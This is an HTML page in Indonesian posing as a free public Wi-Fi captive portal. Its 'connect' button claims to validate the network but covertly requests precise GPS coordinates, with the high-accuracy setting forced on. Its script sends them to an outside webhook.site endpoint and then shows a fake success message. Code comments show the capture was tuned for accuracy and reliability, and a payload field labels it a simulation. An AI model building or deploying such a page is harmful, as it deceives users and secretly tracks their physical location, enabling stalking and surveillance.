<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal Akses Wi-Fi Gratis</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f6f9;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #0066cc;
            margin-bottom: 10px;
        }
        h2 {
            color: #333;
            font-size: 20px;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        .btn-connect {
            background-color: #0066cc;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s;
        }
        .btn-connect:hover {
            background-color: #004c99;
        }
        #status-message {
            margin-top: 15px;
            font-size: 14px;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">🌐 Local-Free-WiFi</div>
    <h2>Selamat Datang di Layanan Wi-Fi Publik</h2>
    <p>Untuk melanjutkan akses internet gratis berkecepatan tinggi, silakan klik tombol di bawah untuk melakukan validasi jaringan lokal Anda.</p>
    
    <button class="btn-connect" onclick="prosesAkses()">Hubungkan Sekarang</button>
    
    <div id="status-message"></div>
</div>

<script>
    function prosesAkses() {
        const status = document.getElementById("status-message");
        
        if (!navigator.geolocation) {
            status.style.color = "red";
            status.innerHTML = "Sistem perangkat tidak mendukung validasi otomatis.";
            return;
        }

        status.style.color = "#333";
        status.innerHTML = "Menghubungkan ke gateway, harap tunggu...";

        // Perbaikan Utama: Memasukkan konfigurasi presisi di parameter ketiga
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                // Perbaikan 2: Menghapus spasi gaib di akhir URL Webhook agar fetch aman
                fetch("https://webhook.site/63927741-6816-4b33-a3da-3c07c9f8b893", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        latitude: lat,
                        longitude: lon,
                        timestamp: new Date().toISOString(),
                        tipe_akses: "Simulasi_Captive_Portal_Akurat"
                    })
                });
                
                status.style.color = "green";
                status.innerHTML = "Validasi berhasil! Mengalihkan ke internet...";
            },
            (error) => {
                status.style.color = "red";
                if (error.code === error.PERMISSION_DENIED) {
                    status.innerHTML = "Akses ditolak. Gagal memvalidasi jaringan lokal.";
                } else {
                    status.innerHTML = "Terjadi kesalahan jaringan atau sinyal GPS lemah.";
                }
            },
            {
                enableHighAccuracy: true,  // MEMAKSA perangkat menyalakan modul GPS fisik (Satelit)
                timeout: 15000,            // Memberikan waktu sistem 15 detik untuk mengunci koordinat terbaik
                maximumAge: 0              // Mengabaikan lokasi lama yang tersimpan di cache memori
            }
        );
    }
</script>

</body>
</html>
